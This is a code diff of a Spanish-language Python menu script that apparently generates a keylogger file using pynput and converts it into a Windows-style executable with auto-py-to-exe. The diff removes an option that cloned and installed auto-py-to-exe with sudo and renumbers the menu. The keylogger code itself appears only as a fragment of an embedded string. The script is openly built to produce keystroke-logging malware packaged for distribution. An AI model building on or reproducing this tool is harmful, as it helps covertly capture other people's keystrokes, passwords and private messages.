@@ -1,4 +1,5 @@
 import os
+import subprocess
 
 os.system("clear")
 
@@ -9,8 +10,7 @@ os.system("clear && figlet Keylogger | lolcat")
 def menu_principal():
     while True:
         print("\n[1] Crear keylogger")
-        print("[2] Instalar auto-py-to-exe")
-        print("[3] Convertir el keylogger a ejectuable")
+        print("[2] Convertir el keylogger a ejectuable")
         opcion = input("\033[1m\n[+] Ingrese una opción: \033[0m")
         if opcion == "1":
             codigo = '''from pynput import keyboard
@@ -44,12 +44,6 @@ if __name__ == "__main__":
                 print("\033[1m\n[+] Se ha creado el archivo 'keylogger.py'\033[0m")
 
         if opcion == "2":
-            os.system("git clone https://github.com/brentvollebregt/auto-py-to-exe.git")
-            os.system("cd auto-py-to-exe")
-            os.system("sudo python setup.py install")
-            os.system("sudo rm -r auto-py-to-exe")
-
-        if opcion == "3":
             os.system("auto-py-to-exe")
 
 menu_principal()
